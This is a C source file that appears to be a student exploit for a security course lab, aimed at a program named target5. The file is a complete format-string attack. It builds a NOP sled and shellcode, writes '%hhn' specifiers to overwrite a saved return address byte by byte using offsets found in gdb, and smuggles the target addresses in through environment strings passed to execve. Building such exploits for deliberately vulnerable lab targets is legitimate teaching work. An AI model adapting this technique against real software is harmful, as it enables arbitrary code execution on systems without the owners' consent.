#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

/**
   rip: 0x2021fe68
   buf: 0x2021fa60
   formatString: 0x2021f960
 */
int main(void)
{
  char *args[3];
  char ex_str[512];
  memset(ex_str, '\x90', 512);
  
  strcpy(ex_str, shellcode);
  ex_str[strlen(ex_str)] = '\x90';
  
  /* 
     0x20(32) -> 0x2021fe68
     0x21(33) -> 0x2021fe69
     0x60(96) -> 0x2021fe6a
     0xfe(254) -> 0x2021fe6b

     by gdb inspecting there are 5 ptrs before the first ptr in formatString
     formatString is 256 bytes(32 8byte word)
     
     last addr is equivalent to 37 param in sprintf
     
     32;
     33 - 32 = 1;
     96 - 33 = 63;
     254 - 96 = 153;
   */

  char fmt_str [] = "%32x%37$hhn %36$hhn%63x%34$hhn%153x%35$hhn";
  memcpy(&ex_str[60], fmt_str, strlen(fmt_str));

  // final 32 bytes would be return addresses
  memcpy(&ex_str[256 - 32], "\x68\xfe\x21\x20\x00", 5);
  
  args[0] = TARGET;
  args[1] = ex_str;
  args[2] = NULL;

  // Encode all '\x00' bytes in env
  char *env[] = {
    "\x00",
    "\x00",
    "\x00",
    "\x69\xfe\x21\x20",
    "\x00",
    "\x00",
    "\x00",
    "\x6a\xfe\x21\x20",
    "\x00",
    "\x00",
    "\x00",
    "\x6b\xfe\x21\x20",
    "\x00",
    "\x00",
    "\x00",
    "\x00",
    NULL
  };

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
